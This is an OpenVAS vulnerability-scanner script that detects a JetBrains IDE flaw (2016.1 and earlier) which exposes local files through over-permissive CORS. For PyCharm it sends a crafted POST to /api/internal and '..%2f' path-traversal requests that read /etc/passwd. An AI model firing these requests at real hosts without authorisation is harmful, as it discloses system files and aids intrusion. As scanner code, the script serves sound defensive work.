###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_jetbrains_loc_file_disc_vuln.nasl 13884 2019-02-26 13:35:59Z cfischer $
#
# JetBrains Remote Code Execution and Local File Disclosure Vulnerability (Active Check)
#
# Authors:
# Tameem Eissa <tameem.eissa@greenbone.net>
#
# Copyright:
# Copyright (C) 2017 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:jetbrains:jetbrains";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107231");
  script_version("$Revision: 13884 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2019-02-26 14:35:59 +0100 (Tue, 26 Feb 2019) $");
  script_tag(name:"creation_date", value:"2017-08-25 10:25:40 +0530 (Fri, 25 Aug 2017)");

  script_tag(name:"qod_type", value:"exploit");
  script_name("JetBrains Remote Code Execution and Local File Disclosure (Active Check)");

  script_tag(name:"summary", value:"This host is installed with Jetbrains and is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Checks if a vulnerable version is present on the target host. If the IDE is Pycharm, send a crafted request via HTTP GET and POST and check the response.");

  script_tag(name:"insight", value:"Multiple flaws are due to Over-permissive CORS settings that allows attackers
  to use a malicious website in order to access various internal API endpoints, gain access to data saved by the IDE, and gather various meta-information like IDE version or open a project.");

  script_tag(name:"impact", value:"Successful exploitation will allow
  remote attackers to read arbitrary files on the target system.");

  script_tag(name:"affected", value:"JetBrains releases 2016.1 and before.");

  script_tag(name:"solution", value:"Updates are available. Please see the references for more information.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://blog.saynotolinux.com/blog/2016/08/15/jetbrains-ide-remote-code-execution-and-local-file-disclosure-vulnerability-analysis/");
  script_xref(name:"URL", value:"https://blog.jetbrains.com/blog/2016/05/11/security-update-for-intellij-based-ides-v2016-1-and-older-versions/");

  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_jetbrains_ide_detection.nasl");
  script_mandatory_keys("jetBrains/installed", "jetBrains/ide");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("host_details.inc");
include("version_func.inc");

function guessProjectName()
{
  Dictionary = make_list("ideas",
                         "purescript",
                         "image-analogies",
                         "powerline-shell",
                         "python-oauth2",
                         "create",
                         "jquery-boilerplate",
                         "sqlbrite",
                         "foresight.js",
                         "iOS-Core-Animation-Advanced-Techniques",
                         "elemental",
                         "peek",
                         "TheAmazingAudioEngine",
                         "orientdb",
                         "testing");

  foreach name ( Dictionary ) {
    url = "/" + name + "/.idea/workspace.xml";
    req = http_get_req( port: port, url: url, add_headers: make_array('Content-Type', 'application/xml') );
    res = http_keepalive_send_recv( port: port, data: req );

    if ( res =~ "HTTP/1.. 200" )
        break;
  }

  if ( !isnull( name ) )
    return name;
  else
    return;
}

function buildDotsSegsToRoot( path )
{
  i = 0;
  depth = 0;
  while (i < strlen( path ) )
  {
    if ( path[i] == "/" )
      depth += 1;
    i++;
  }

  for ( i = 0; i < depth; i = i + 1 )
    dotSegs += "..%2f";

  return dotSegs;
}

function leakWithPyCharmHelpers( homePath )
{
  projectName = "helpers";
  projectPath = homePath + "/helpers";
  url = "/api/internal";
  data = '{"url": "jetbrains://whatever/open//' + projectPath + '"}' ;

  req = http_post_req(port: port, url: url, data: data,
                      add_headers: make_array( 'Content-Type', 'application/x-www-form-urlencoded') );
  res = http_keepalive_send_recv( port: port, data: req );

  dotSegs = buildDotsSegsToRoot(path: projectPath);

  url = "/helpers"  +  "/" + dotSegs + "etc/passwd";

  if (http_vuln_check( port: port, url: url, pattern: "root:.*:0:[01]:", check_header: TRUE ) ) {
    report = report_vuln_url( port:port, url:url ) + '\n\n';

  return report;

 }

}

function leakWithProject(name)
{
  dotSegs = "";
  for ( i = 1; i < 5; i = i + 1 ) {
    dotSegs += "..%2f";

    url = "/" + name +  "/" + dotSegs + "etc/passwd";

    if (http_vuln_check( port: port, url: url, pattern: "root:.*:0:[01]:", check_header: TRUE )) {
        report = report_vuln_url( port:port, url:url ) + '\n\n';
        return report;
     }
  }
  return;
}


if (!port = get_app_port( cpe: CPE ) ) exit ( 0 );

if (!ide = get_kb_item ( "jetBrains/ide" ) ) exit ( 0 );

version = get_app_version( cpe: CPE, port: port );

if (version) {
  if ( version_is_less_equal( version: version, test_version: "2016.1" ) )
    jetbrains_report = report_fixed_ver(installed_version: version, fixed_version: "See Vendor");
}

if ( ide == "^PyCharm" ) {

    # Active Exploit will be executed if the helpers project or one of the projects listed in Dictionary exist in the Installation of PyCharm.

  configPath = get_kb_item( "jetBrains/configpath" );
  homePath = get_kb_item( "jetBrains/homepath" );

  if (!isnull( homePath ) )
    Pycharm_report = leakWithPyCharmHelpers( homePath: homePath );
  else {
    ProjectName = guessProjectName();
    if (!isnull( ProjectName ) )
      Pycharm_report = leakWithProject( name: ProjectName );
  }

}

if (!isnull(Pycharm_report) || jetbrains_report) {
  if (isnull( Pycharm_report ))
    report = jetbrains_report;
  else
    report = Pycharm_report + "\n" + jetbrains_report;

  security_message( port:port, data:report );
  exit(0);
}

exit(99);
